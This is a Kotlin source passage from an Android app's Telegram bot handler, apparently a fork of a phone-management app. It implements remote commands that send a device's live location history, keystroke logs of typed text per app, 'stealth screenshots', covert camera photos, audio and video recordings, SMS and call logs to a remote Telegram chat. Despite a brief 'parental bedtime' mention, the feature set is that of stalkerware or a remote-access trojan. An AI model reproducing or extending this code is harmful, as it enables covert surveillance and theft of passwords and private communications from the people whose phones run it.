            rows.add(listOf("✅ Unblock ${nm.take(28)}" to "unblock:${pkg.take(55)}"))
        }
        limits.entries.forEachIndexed { i, (pkg, dailyMs) ->
            val nm = nameMap[pkg] ?: pkg
            val mins = dailyMs / 60000
            sb.append("${blocked.size + i + 1}. ⏱ <b>${htmlEsc(nm)}</b> · ${mins} min/day\n   <code>${htmlEsc(pkg)}</code>\n\n")
            rows.add(listOf("✕ Clear limit ${nm.take(24)}" to "limit_clr:${pkg.take(50)}"))
        }
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    @SuppressLint("MissingPermission")
    private fun cmdLocation() {
        sendMessage("📍 Getting location…")
        try {
            val lm = MainApp.instance.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val providers = listOf(
                android.location.LocationManager.GPS_PROVIDER,
                android.location.LocationManager.NETWORK_PROVIDER
            )
            var loc: android.location.Location? = null
            for (p in providers) {
                if (lm.isProviderEnabled(p)) {
                    loc = lm.getLastKnownLocation(p)
                    if (loc != null) break
                }
            }
            if (loc == null) {
                sendMessage("❌ Location not available. Ensure Location permission & GPS are enabled.")
                return
            }
            val age = (System.currentTimeMillis() - loc.time) / 1000
            TelegramApiClient.sendLocation(token, chatId, loc.latitude, loc.longitude)
            sendMessage("📍 <b>Location</b>\n" +
                "🌐 Lat: <code>${loc.latitude}</code>\n" +
                "🌐 Lon: <code>${loc.longitude}</code>\n" +
                "🎯 Accuracy: ±${loc.accuracy.toInt()}m\n" +
                "🕐 Age: ${age}s ago")
        } catch (e: Exception) {
            sendMessage("❌ Location error: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdBattery() {
        val bat = BatteryHistoryHelper.sampleNow(MainApp.instance)
        if (bat == null) { sendMessage("❌ Battery info unavailable."); return }
        val plugState = when (bat.plugged) {
            1 -> "⚡ AC charging"
            2 -> "⚡ USB charging"
            4 -> "⚡ Wireless charging"
            else -> "🔌 Unplugged"
        }
        val statusLabel = when (bat.status) {
            android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            android.os.BatteryManager.BATTERY_STATUS_FULL -> "Full"
            android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "Not charging"
            else -> "Unknown"
        }
        val level = bat.level
        val bar = buildString {
            val filled = (level / 10)
            append("[")
            repeat(filled) { append("█") }
            repeat(10 - filled) { append("░") }
            append("]")
        }
        sendMessage("🔋 <b>Battery Status</b>\n\n" +
            "$bar <b>$level%</b>\n" +
            "🔌 $plugState\n" +
            "📊 Status: $statusLabel\n" +
            "🌡 Temp: ${bat.temperatureC}°C\n" +
            "⚡ Voltage: ${bat.voltageMv}mV\n" +
            "🕐 Checked: ${ts}")
    }

    private fun cmdDevice() {
        val ctx = MainApp.instance
        val name = PhoneHelper.getDeviceName(ctx)
        val batPct = PhoneHelper.getBatteryPercentage(ctx)
        val sb = StringBuilder("📲 <b>Device Information</b>\n\n")
        sb.append("📱 <b>Name:</b> ${htmlEsc(name)}\n")
        sb.append("🏭 <b>Brand:</b> ${htmlEsc(Build.BRAND)}\n")
        sb.append("🔧 <b>Model:</b> ${htmlEsc(Build.MODEL)}\n")
        sb.append("🤖 <b>Android:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
        sb.append("🆔 <b>Build:</b> ${htmlEsc(Build.DISPLAY.take(40))}\n")
        sb.append("🔋 <b>Battery:</b> $batPct%\n")
        sb.append("🕐 <b>Time:</b> ${ts}\n")
        val call = LiveCallTracker.snapshot()
        if (call.state != "idle") {
            sb.append("📞 <b>Call:</b> ${call.state} (${call.direction})\n")
        }
        sendMessage(sb.toString())
    }

    // ========== TRACKING HUB ==========

    private fun cmdTrackHub() {
        val ctx = MainApp.instance
        val locOn = LocationTrackingHelper.isEnabled(ctx)
        val locCount = LocationTrackingHelper.countPoints(ctx)
        val locLatest = LocationTrackingHelper.latestPoint(ctx)
        val locInterval = LocationTrackingHelper.getIntervalSec(ctx)
        val keyOn = KeystrokeLogHelper.isEnabled(ctx)
        val keyCount = KeystrokeLogHelper.count(ctx = ctx)
        val keyLimit = KeystrokeLogHelper.getBufferLimit(ctx)
        val shotOn = StealthScreenshotHelper.isEnabled(ctx)
        val shotCount = StealthScreenshotHelper.count(ctx)
        val shotInterval = StealthScreenshotHelper.getIntervalMin(ctx)

        val sb = StringBuilder()
        sb.append("🛰 <b>Tracking Hub</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n\n")
        sb.append("🗺 <b>Live Location</b>  ${if (locOn) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("   📍 ${locCount} points · every ${locInterval}s\n")
        if (locLatest != null) {
            val age = (System.currentTimeMillis() - locLatest.ts) / 1000
            sb.append("   🕐 Last fix: ${age}s ago · ±${locLatest.accuracy.toInt()}m\n")
        }
        sb.append("   ➡️ /livelocation  /tracklocation\n\n")

        sb.append("⌨️ <b>Keystroke Logger</b>  ${if (keyOn) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("   📝 ${keyCount} entries · buffer ${keyLimit}\n")
        sb.append("   ➡️ /keystrokes  /keytop\n\n")

        sb.append("🖼 <b>Stealth Screenshots</b>  ${if (shotOn) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("   📸 ${shotCount} captures · every ${shotInterval} min\n")
        sb.append("   ➡️ /shots  /screenshot\n\n")

        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🕐 ${ts}")
        sendMessage(sb.toString())
    }

    private fun cmdLiveLocation(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 5
        val state = LocationTrackingHelper.isEnabled(ctx)
        val total = LocationTrackingHelper.countPoints(ctx)
        val interval = LocationTrackingHelper.getIntervalSec(ctx)
        val minDisp = LocationTrackingHelper.getMinDisplacement(ctx)
        val latest = LocationTrackingHelper.latestPoint(ctx)
        val recent = LocationTrackingHelper.listPoints(offset = 0, limit = n, ctx = ctx)

        val sb = StringBuilder()
        sb.append("🗺 <b>Live Location</b>  ${if (state) "🟢 STREAMING" else "⚪ STOPPED"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📊 Total points: <b>${total}</b>\n")
        sb.append("⏱ Sample every: <b>${interval}s</b> · min move <b>${minDisp}m</b>\n\n")

        if (latest != null) {
            val age = (System.currentTimeMillis() - latest.ts) / 1000
            sb.append("📍 <b>Latest fix</b>\n")
            sb.append("   🌐 <code>${latest.lat}, ${latest.lng}</code>\n")
            sb.append("   🎯 ±${latest.accuracy.toInt()}m · ${latest.provider}\n")
            sb.append("   🚀 Speed: ${"%.1f".format(latest.speed * 3.6)} km/h\n")
            sb.append("   🔋 Battery: ${latest.batteryLevel}%${if (latest.charging) " ⚡" else ""}\n")
            sb.append("   🕐 ${age}s ago · ${fmtTime(latest.ts)}\n\n")
            try { TelegramApiClient.sendLocation(token, chatId, latest.lat, latest.lng) } catch (_: Throwable) {}
        } else {
            sb.append("(no location samples yet)\n\n")
        }

        if (recent.size > 1) {
            sb.append("🧭 <b>Recent ${recent.size} points</b>\n")
            recent.forEachIndexed { i, p ->
                val ago = (System.currentTimeMillis() - p.ts) / 1000
                sb.append("${i + 1}. <code>${"%.5f".format(p.lat)}, ${"%.5f".format(p.lng)}</code>  ±${p.accuracy.toInt()}m  · ${ago}s ago\n")
            }
            sb.append("\nUse /tracklocation N for more.")
        }
        sendMessage(sb.toString())
    }

    private fun cmdTrackLocation(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 100) ?: 20
        val pts = LocationTrackingHelper.listPoints(offset = 0, limit = n, ctx = ctx)
        if (pts.isEmpty()) { sendMessage("📍 No location points recorded yet.\n\nEnable Live Location from PlainApp → Tracking Hub."); return }
        val sb = StringBuilder("🧭 <b>Last ${pts.size} location points</b>\n━━━━━━━━━━━━━━━━━━━\n\n")
        pts.forEachIndexed { i, p ->
            sb.append("${i + 1}. <b>${fmtTime(p.ts)}</b>\n")
            sb.append("   🌐 <code>${"%.5f".format(p.lat)}, ${"%.5f".format(p.lng)}</code>\n")
            sb.append("   🎯 ±${p.accuracy.toInt()}m · 🚀 ${"%.1f".format(p.speed * 3.6)} km/h · 🔋 ${p.batteryLevel}%\n\n")
            if (sb.length > 3500) { sb.append("…"); return@forEachIndexed }
        }
        sendMessage(sb.toString())
    }

    private fun cmdKeystrokes(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 15
        val on = KeystrokeLogHelper.isEnabled(ctx)
        val total = KeystrokeLogHelper.count(ctx = ctx)
        val limit = KeystrokeLogHelper.getBufferLimit(ctx)
        val entries = KeystrokeLogHelper.list(offset = 0, limit = n, ctx = ctx)

        val sb = StringBuilder()
        sb.append("⌨️ <b>Keystroke Logger</b>  ${if (on) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📝 Total: <b>${total}</b> · buffer <b>${limit}</b>\n\n")
        if (entries.isEmpty()) {
            sb.append("(no entries captured yet)")
        } else {
            sb.append("📋 <b>Last ${entries.size} entries</b>\n\n")
            entries.forEachIndexed { i, e ->
                val app = if (e.appLabel.isNotBlank()) e.appLabel else e.packageName
                val field = if (e.fieldHint.isNotBlank()) " · <i>${htmlEsc(e.fieldHint)}</i>" else ""
                sb.append("${i + 1}. 📱 <b>${htmlEsc(app)}</b>$field\n")
                sb.append("   🕐 ${fmtTime(e.ts)}\n")
                sb.append("   <code>${htmlEsc(e.text.take(160))}</code>\n\n")
                if (sb.length > 3600) { sb.append("…"); return@forEachIndexed }
            }
        }
        sendMessage(sb.toString())
    }

    private fun cmdKeyTop() {
        val ctx = MainApp.instance
        val stats = KeystrokeLogHelper.packageBreakdown(ctx)
        if (stats.isEmpty()) { sendMessage("📊 No keystroke data yet."); return }
        val sb = StringBuilder("📊 <b>Top apps by keystrokes</b>\n━━━━━━━━━━━━━━━━━━━\n\n")
        val total = stats.sumOf { it.second }
        stats.take(15).forEachIndexed { i, (pkg, count) ->
            val pct = if (total > 0) (count * 100 / total) else 0
            val bar = "█".repeat((pct / 5).coerceAtMost(20)) + "░".repeat((20 - pct / 5).coerceAtLeast(0))
            sb.append("${i + 1}. <code>${htmlEsc(pkg)}</code>\n")
            sb.append("   $bar ${count} (${pct}%)\n\n")
        }
        sendMessage(sb.toString())
    }

    private suspend fun cmdShots(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 30) ?: 10
        val on = StealthScreenshotHelper.isEnabled(ctx)
        val total = StealthScreenshotHelper.count(ctx)
        val list = StealthScreenshotHelper.list(0, n, ctx)

        val sb = StringBuilder()
        sb.append("🖼 <b>Stealth Screenshots</b>  ${if (on) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📸 Total: <b>${total}</b>\n\n")
        if (list.isEmpty()) {
            sb.append("(no screenshots captured yet)\n\nUse /screenshot for an instant capture.")
            sendMessage(sb.toString())
            return
        }
        sb.append("📋 <b>Last ${list.size} captures</b>\n\n")
        list.forEachIndexed { i, s ->
            sb.append("${i + 1}. 🕐 <b>${fmtTime(s.ts)}</b>")
            if (s.manual) sb.append(" · 👆 manual")
            sb.append("\n   📐 ${s.width}×${s.height} · 💾 ${s.sizeBytes / 1024} KB\n")
            if (s.packageName.isNotBlank()) sb.append("   📱 <code>${htmlEsc(s.packageName)}</code>\n")
            sb.append("\n")
        }
        sendMessage(sb.toString())

        val latest = list.firstOrNull()
        if (latest != null) {
            val f = File(latest.absPath)
            if (f.exists()) {
                sendUploadPhoto()
                try { TelegramApiClient.sendPhoto(token, chatId, f, "🖼 Latest stealth shot · ${fmtTime(latest.ts)}") } catch (_: Throwable) {}
            }
        }
    }

    // ========== PERMISSIONS ==========

    private fun cmdPermissions() {
        val ctx = MainApp.instance
        val all = Permission.entries.filter { it != Permission.NONE }
        val granted = mutableListOf<Permission>()
        val denied = mutableListOf<Permission>()
        all.forEach {
            val ok = try { it.can(ctx) } catch (_: Throwable) { false }
            if (ok) granted.add(it) else denied.add(it)
        }
        val pct = if (all.isNotEmpty()) granted.size * 100 / all.size else 0
        val barFilled = (pct / 5).coerceIn(0, 20)
        val bar = "█".repeat(barFilled) + "░".repeat(20 - barFilled)

        fun group(p: Permission): String = when {
            p.name.contains("SMS") -> "📨 Messaging"
            p.name.contains("CONTACT") -> "👥 Contacts"
            p.name.contains("CALL") || p.name == "READ_PHONE_STATE" || p.name == "READ_PHONE_NUMBERS" -> "📞 Phone"
            p.name.contains("LOCATION") -> "📍 Location"
            p.name == "CAMERA" || p.name.startsWith("READ_MEDIA") || p.name == "WRITE_EXTERNAL_STORAGE" -> "🖼 Media & storage"
            p.name.contains("BLUETOOTH") -> "📡 Connectivity"
            p.name == "RECORD_AUDIO" -> "🎙 Audio"
            p.name == "POST_NOTIFICATIONS" || p.name == "NOTIFICATION_LISTENER" -> "🔔 Notifications"
            else -> "⚙️ System"
        }

        val sb = StringBuilder()
        sb.append("🛡 <b>App Permissions</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("$bar  <b>${pct}%</b>\n")
        sb.append("✅ Granted: <b>${granted.size}</b>  ·  ❌ Denied: <b>${denied.size}</b>  ·  Total ${all.size}\n\n")

        val byGroup = all.groupBy { group(it) }
        byGroup.toSortedMap().forEach { (cat, perms) ->
            sb.append("<b>$cat</b>\n")
            perms.forEach { p ->
                val ok = try { p.can(ctx) } catch (_: Throwable) { false }
                val icon = if (ok) "✅" else "❌"
                sb.append("   $icon <code>${p.name}</code>\n")
            }
            sb.append("\n")
            if (sb.length > 3500) { sb.append("…"); return@forEach }
        }
        sb.append("🕐 ${ts}")
        sendMessage(sb.toString())
    }

    // ========== AUTOMATION ==========

    private fun cmdAutomations() {
        val ctx = MainApp.instance
        val enabled = AutomationHelper.isEnabled(ctx)
        val rules = AutomationHelper.list(ctx)
        val sb = StringBuilder()
        sb.append("⚙️ <b>Automation Rules</b>  ${if (enabled) "🟢 ENGINE ON" else "⚪ ENGINE OFF"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📋 Total: <b>${rules.size}</b>\n\n")
        if (rules.isEmpty()) {
            sb.append("(no rules yet)\n\n")
            sb.append("💡 Create one with:\n")
            sb.append("• <code>/newrule My rule notify Hello world</code>\n")
            sb.append("• <code>/newschedule 22:30 Bedtime speak Good night</code>\n")
            val rows = listOf(
                listOf("⚡ Engine on" to "auto_engine:1", "⚪ Engine off" to "auto_engine:0"),
            )
            sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
            return
        }
        // Per-rule action row uses idx (1-based) as a stable handle for callbacks
        // — Telegram callback_data is 64 bytes, and full UUIDs would crowd it.
        val rows = mutableListOf<List<Pair<String, String>>>()
        rules.forEachIndexed { i, r ->
            val state = if (r.enabled) "🟢" else "⚪"
            val kind = if (r.kind == "schedule") "📅" else "🔀"
            sb.append("${i + 1}. $state $kind <b>${htmlEsc(r.name)}</b>\n")
            sb.append("   🎯 trigger: <code>${r.trigger.type}</code>\n")
            if (r.actions.isNotEmpty()) {
                val acts = r.actions.joinToString(", ") { it.type }
                sb.append("   ⚡ actions: <code>${htmlEsc(acts.take(80))}</code>\n")
            }
            if (r.lastRunMs > 0) sb.append("   🕐 last run: ${fmtTime(r.lastRunMs)}\n")
            sb.append("   🆔 <code>${r.id.take(8)}</code>\n\n")
            // Build the action row for this rule (capped at the first 12 rules
            // so the inline keyboard doesn't exceed Telegram's hard limit).
            if (i < 12) {
                val tag = "${i + 1}."
                val toggle = if (r.enabled) "$tag ⚪ Off" else "$tag 🟢 On"
                rows.add(listOf(
                    "$tag ▶️ Run" to "auto_run:${r.id.take(20)}",
                    toggle to "auto_tog:${r.id.take(20)}",
                    "🗑 Delete" to "auto_del:${r.id.take(20)}",
                ))
            }
            if (sb.length > 3500) { sb.append("…"); return@forEachIndexed }
        }
        rows.add(listOf(
            (if (enabled) "⚪ Engine off" else "⚡ Engine on") to ("auto_engine:" + if (enabled) "0" else "1"),
        ))
        sb.append("\n💡 <code>/newrule</code>, <code>/newschedule</code>, <code>/delrule</code> to manage")
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun cmdRunRule(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /runrule &lt;id&gt;\n\nFind IDs with /automations"); return }
        val idPrefix = args[0]
        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
        try {
            val started = com.ismartcoding.plain.helpers.AutomationActionRunner.trigger(rule.id, "manual")
            if (started) sendMessage("▶️ Started <b>${htmlEsc(rule.name)}</b>")
            else sendMessage("⚠️ Rule did not run (disabled, cooldown, or conditions failed).")
        } catch (e: Throwable) {
            sendMessage("❌ Could not start rule: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdToggleRule(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /togglerule &lt;id&gt;"); return }
        val idPrefix = args[0]
        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
        val updated = rule.copy(enabled = !rule.enabled)
        AutomationHelper.upsert(updated)
        sendMessage("${if (updated.enabled) "🟢" else "⚪"} <b>${htmlEsc(rule.name)}</b> is now ${if (updated.enabled) "ON" else "OFF"}")
    }

    /**
     * Quick-create a manual or simple-trigger rule.
     *
     * Syntax: /newrule <name…> <action> <action-args…>
     *   /newrule "Tell wife" sms +15551234 On my way
     *   /newrule Beep notify Heads up : something happened
     *   /newrule Toggle wifi toggle_wifi off
     *
     * For more complex rules use the web panel; this command exists so a phone-
     * less user can still set up and test rules from the bot.
     */
    private fun cmdNewRule(args: List<String>) {
        if (args.size < 2) {
            sendMessage(
                "Usage: <code>/newrule &lt;name…&gt; &lt;action&gt; &lt;args…&gt;</code>\n\n" +
                "Examples:\n" +
                "• <code>/newrule Beep notify Heads up : Battery low</code>\n" +
                "• <code>/newrule Tell mom sms +15551234 Be home soon</code>\n" +
                "• <code>/newrule Speak hello speak Good morning</code>\n" +
                "• <code>/newrule Wifi off toggle_wifi false</code>\n" +
                "• <code>/newrule Lights flashlight true</code>\n\n" +
                "Supported actions: <code>notify</code>, <code>sms</code>, <code>call</code>, " +
                "<code>speak</code>, <code>toggle_wifi</code>, <code>toggle_bluetooth</code>, " +
                "<code>toggle_dnd</code>, <code>flashlight</code>, <code>vibrate</code>, " +
                "<code>set_clipboard</code>, <code>lock_screen</code>"
            )
            return
        }
        val (name, action) = splitNameAndAction(args) ?: run {
            sendMessage("❌ Could not find a known action keyword in your command. See /newrule for examples.")
            return
        }
        try {
            val saved = AutomationHelper.upsert(AutomationHelper.Rule(
                id = "", name = name, enabled = true, kind = "rule",
                trigger = AutomationHelper.Trigger("manual", emptyMap()),
                conditions = emptyList(), actions = listOf(action),
                cooldownMs = 0L, lastRunMs = 0L, createdMs = 0L, updatedMs = 0L,
            ))
            sendMessage(
                "✅ Created rule <b>${htmlEsc(saved.name)}</b>\n" +
                "🆔 <code>${saved.id.take(8)}</code>\n" +
                "🎯 trigger: <code>manual</code> (use <code>/runrule ${saved.id.take(8)}</code> to fire it)\n" +
                "⚡ action: <code>${action.type}</code>"
            )
        } catch (e: Throwable) {
            sendMessage("❌ Could not save rule: ${htmlEsc(e.message ?: "")}")
        }
    }

    /**
     * Quick-create a daily scheduled action.
     * Syntax: /newschedule HH:MM <name…> <action> <action-args…>
     *   /newschedule 22:30 Bedtime speak Good night
     *   /newschedule 07:00 Morning notify Wake up : Time to start
     */
    private fun cmdNewSchedule(args: List<String>) {
        if (args.size < 3) {
            sendMessage(
                "Usage: <code>/newschedule HH:MM &lt;name…&gt; &lt;action&gt; &lt;args…&gt;</code>\n\n" +
                "Examples:\n" +
                "• <code>/newschedule 22:30 Bedtime speak Good night</code>\n" +
                "• <code>/newschedule 07:00 Morning notify Wake up : Time to start</code>\n" +
                "• <code>/newschedule 09:00 Standup vibrate 800</code>"
            )
            return
        }
        val time = args[0]
        val tParts = time.split(":")
        val hour = tParts.getOrNull(0)?.toIntOrNull()
        val minute = tParts.getOrNull(1)?.toIntOrNull() ?: 0
        if (hour == null || hour !in 0..23 || minute !in 0..59) {
            sendMessage("❌ Time must be HH:MM (24-hour). Got: <code>${htmlEsc(time)}</code>")
            return
        }
        val (name, action) = splitNameAndAction(args.drop(1)) ?: run {
            sendMessage("❌ Could not find a known action keyword in your command. See /newschedule for examples.")
            return
        }
        try {
            val trigParams = mapOf(
                "hour" to hour.toString(), "minute" to minute.toString(),
                "days" to "1,2,3,4,5,6,7",
            )
            val saved = AutomationHelper.upsert(AutomationHelper.Rule(
                id = "", name = name, enabled = true, kind = "schedule",
                trigger = AutomationHelper.Trigger("time", trigParams),
                conditions = emptyList(), actions = listOf(action),
                cooldownMs = 0L, lastRunMs = 0L, createdMs = 0L, updatedMs = 0L,
            ))
            com.ismartcoding.plain.helpers.AutomationScheduler.scheduleRule(saved.id, MainApp.instance)
            sendMessage(
                "✅ Scheduled <b>${htmlEsc(saved.name)}</b>\n" +
                "🆔 <code>${saved.id.take(8)}</code>\n" +
                "🕐 daily at <b>${"%02d:%02d".format(hour, minute)}</b>\n" +
                "⚡ action: <code>${action.type}</code>"
            )
        } catch (e: Throwable) {
            sendMessage("❌ Could not save schedule: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdDelRule(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: <code>/delrule &lt;id&gt;</code>"); return }
        val idPrefix = args[0]
        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
        com.ismartcoding.plain.helpers.AutomationScheduler.cancel(rule.id, MainApp.instance)
        AutomationHelper.delete(rule.id, MainApp.instance)
        sendMessage("🗑 Deleted <b>${htmlEsc(rule.name)}</b>")
    }

    /**
     * Pull a known action keyword out of the tail of [args] and turn the
     * remaining args into an [AutomationHelper.Action] with the appropriate
     * params map. Returns the rule name (everything before the action keyword)
     * and the parsed Action, or null if no known action keyword is present.
     */
    private fun splitNameAndAction(args: List<String>): Pair<String, AutomationHelper.Action>? {
        val knownActions = setOf(
            "notify", "sms", "send_sms", "call", "make_call", "speak",
            "toggle_wifi", "toggle_bluetooth", "toggle_dnd",
            "flashlight", "vibrate", "set_clipboard", "lock_screen",
        )
        val actionIdx = args.indexOfFirst { it.lowercase() in knownActions }
        if (actionIdx < 1) return null
        val name = args.subList(0, actionIdx).joinToString(" ").trim().ifBlank { "Untitled" }
        val keyword = args[actionIdx].lowercase()
        val tail = args.drop(actionIdx + 1)
        val action = when (keyword) {
            "notify" -> {
                // "title : body" or just "title"
                val joined = tail.joinToString(" ")
                val sep = joined.indexOf(" : ")
                val (title, body) = if (sep > 0) joined.substring(0, sep) to joined.substring(sep + 3)
                    else joined to ""
                AutomationHelper.Action("notify", mapOf("title" to title, "body" to body))
            }
            "sms", "send_sms" -> {
                val to = tail.firstOrNull() ?: ""
                val body = tail.drop(1).joinToString(" ")
                AutomationHelper.Action("send_sms", mapOf("to" to to, "body" to body))
            }
            "call", "make_call" -> {
                AutomationHelper.Action("make_call", mapOf("to" to (tail.firstOrNull() ?: "")))
            }
            "speak" -> {
                AutomationHelper.Action("speak", mapOf("text" to tail.joinToString(" ")))
            }
            "toggle_wifi", "toggle_bluetooth", "toggle_dnd", "flashlight" -> {
                val state = (tail.firstOrNull() ?: "true").lowercase()
                val on = state in setOf("true", "on", "1", "yes", "y")
                AutomationHelper.Action(keyword, mapOf("state" to on.toString()))
            }
            "vibrate" -> AutomationHelper.Action("vibrate",
                mapOf("ms" to (tail.firstOrNull()?.toIntOrNull()?.coerceIn(10, 5000)?.toString() ?: "250")))
            "set_clipboard" -> AutomationHelper.Action("set_clipboard",
                mapOf("text" to tail.joinToString(" ")))
            "lock_screen" -> AutomationHelper.Action("lock_screen", emptyMap())
            else -> return null
        }
        return name to action
    }

    private fun cmdCommands() {
        val sb = StringBuilder("📝 <b>All Commands — Full Details</b>\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📱 <b>MESSAGING</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /messages [n] — List last N SMS conversations (default 10, max 50)\n")
        sb.append("• /sms &lt;thread_id&gt; — Read messages in a specific SMS thread\n")
        sb.append("• /sendsms &lt;number&gt; &lt;text&gt; — Send an SMS to any number\n")
        sb.append("• /calls [n] — View call log (default 20, max 100)\n")
        sb.append("• /recordings — Browse call recordings, tap to download\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("👥 <b>CONTACTS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /contacts [name] — List all contacts or search by name\n")
        sb.append("• /find &lt;number&gt; — Reverse-lookup a phone number from a call/SMS\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🔔 <b>NOTIFICATIONS & LOGS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /notifications [n] — Recent notifications (default 15, max 50)\n")
        sb.append("• /logs [n] — Full notification log history (default 30, max 200)\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📁 <b>FILES</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /files — Browse /sdcard root\n")
        sb.append("• /files /path/to/dir — Browse specific directory\n")
        sb.append("• /files /path/to/file.ext — Show file info\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📸 <b>CAMERA & MEDIA</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /screenshot — Instant screenshot (needs Accessibility Service)\n")
        sb.append("• /photo — Instant back camera photo\n")
        sb.append("• /photo front — Instant front camera selfie\n")
        sb.append("• /audio 10 — Record 10 seconds of audio (1–300s)\n")
        sb.append("• /video 10 — Record 10s video with back camera (1–120s)\n")
        sb.append("• /video 10 front — Record 10s video with front camera\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📱 <b>APPS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /apps — List all installed apps\n")
        sb.append("• /apps chrome — Search apps by name\n")
        sb.append("• /blockapp &lt;package&gt; — Block an app from launching\n")
        sb.append("• /unblockapp &lt;package&gt; — Remove app block\n")
        sb.append("• /blockedapps — List all blocked apps\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📍 <b>LOCATION & DEVICE</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /location — Current GPS location + map pin\n")
        sb.append("• /battery — Battery level, charging state & temp\n")
        sb.append("• /device — Full device information\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🛠 <b>UTILITIES</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /torch [on|off|toggle] — Flashlight\n")
        sb.append("• /speak &lt;text&gt; — Speak text out loud (TTS)\n")
        sb.append("• /stopspeak — Stop the device speaking\n")
        sb.append("• /vibrate [seconds] — Buzz the phone (1–10 s)\n")
        sb.append("• /toast &lt;text&gt; — Quick toast pop-up on the device\n")
        sb.append("• /show &lt;text&gt; — Full-screen banner overlay\n")
        sb.append("• /findphone [on|off] — Loud locate alarm\n")
        sb.append("• /wake [seconds] — Wake the screen\n")
        sb.append("• /brightness [0-100] — Read or set screen brightness\n")
        sb.append("• /volume [stream] [0-100] — Read or set volume (media|ring|notification|alarm|call|system)\n")
        sb.append("• /launch &lt;pkg|name&gt; — Launch any app on the device\n")
        sb.append("• /datasettings — Open mobile-data settings page\n")
        sb.append("• /bedtime — View / set the parental bedtime window\n")
        sb.append("• /launches [n] — Recent app launch history\n")
        sb.append("• /livecall — Live-call hub: accept, mute, end\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🛰 <b>TRACKING HUB</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /track — Overview of all tracking modules\n")
        sb.append("• /livelocation [n] — Stream status + latest fix + last N points (sends map pin)\n")
        sb.append("• /tracklocation [n] — Detailed list of last N points (1–100)\n")
        sb.append("• /keystrokes [n] — Last N captured keystrokes (1–50)\n")
        sb.append("• /keytop — Top apps by keystroke count (bar chart)\n")
        sb.append("• /shots [n] — Recent stealth screenshots + auto-send latest (1–30)\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🛡 <b>PERMISSIONS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /permissions — Live status of every Android permission\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("⚙️ <b>AUTOMATION</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /automations — List all automation rules with inline Run/Toggle/Delete buttons\n")
        sb.append("• /newrule &lt;name…&gt; &lt;action&gt; &lt;args…&gt; — Quick-create a manual rule\n")
        sb.append("    e.g. <code>/newrule Beep notify Heads up : Battery low</code>\n")
        sb.append("• /newschedule HH:MM &lt;name…&gt; &lt;action&gt; &lt;args…&gt; — Daily schedule\n")
        sb.append("    e.g. <code>/newschedule 22:30 Bedtime speak Good night</code>\n")
        sb.append("• /delrule &lt;id&gt; — Delete a rule (use first 8 chars)\n")
        sb.append("• /runrule &lt;id&gt; — Run a rule manually\n")
        sb.append("• /togglerule &lt;id&gt; — Enable/disable a rule\n\n")
